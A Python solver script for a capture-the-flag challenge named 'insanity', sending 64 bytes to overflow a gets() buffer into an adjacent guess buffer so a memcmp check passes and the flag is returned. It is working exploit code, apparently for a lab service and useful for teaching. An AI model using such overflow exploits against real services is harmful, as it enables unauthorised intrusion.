#!/usr/bin/env python3
"""Solver for "insanity".

Usage:
    python3 solve.py <host> <port>            # remote instance (TLS)
    python3 solve.py <host>:<port>            # same, one argument
    python3 solve.py 127.0.0.1 1337 --no-tls  # local container (plain TCP)
"""
import argparse
import socket
import ssl
import sys
from urllib.parse import urlparse


def recv_until(sock, marker, timeout=10.0):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def recv_all(sock, timeout=5.0):
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def parse_target(target, port):
    if "://" in target:
        parsed = urlparse(target)
        target = parsed.hostname or ""
        port = port or parsed.port
    elif target.count(":") == 1 and port is None:
        target, port_text = target.rsplit(":", 1)
        port = int(port_text)
    if not target or port is None:
        raise SystemExit("usage: solve.py HOST PORT [--no-tls]")
    return target, int(port)


def main():
    ap = argparse.ArgumentParser(description="Solve insanity.")
    ap.add_argument("target", help="host, host:port, or tls://host:port")
    ap.add_argument("port", nargs="?", type=int, help="port if not in target")
    ap.add_argument("--no-tls", action="store_true",
                    help="plain TCP (local container); remote instances are TLS")
    ap.add_argument("--insecure", action="store_true",
                    help="skip TLS certificate verification")
    args = ap.parse_args()

    host, port = parse_target(args.target, args.port)

    raw = socket.create_connection((host, port), timeout=10)
    if args.no_tls:
        sock = raw
    else:
        ctx = ssl.create_default_context()
        if args.insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw, server_hostname=host)

    banner = recv_until(sock, b"your guess: ")
    sys.stdout.write(banner.decode(errors="replace"))
    sys.stdout.flush()

    # main() layout: input[32] at rbp-0x50, guess[32] at rbp-0x30.
    # gets(input) does not stop at 32 bytes, so the next 32 bytes overwrite
    # guess. memcmp(input, guess, 32) then compares our 32 bytes with
    # themselves. The canary at rbp-0x8 is untouched.
    sock.sendall(b"A" * 64 + b"\n")

    out = recv_all(sock)
    sys.stdout.write(out.decode(errors="replace"))
    sys.stdout.flush()
    sock.close()

    if b"ingehack{" not in out:
        raise SystemExit("[-] no flag in response")


if __name__ == "__main__":
    main()
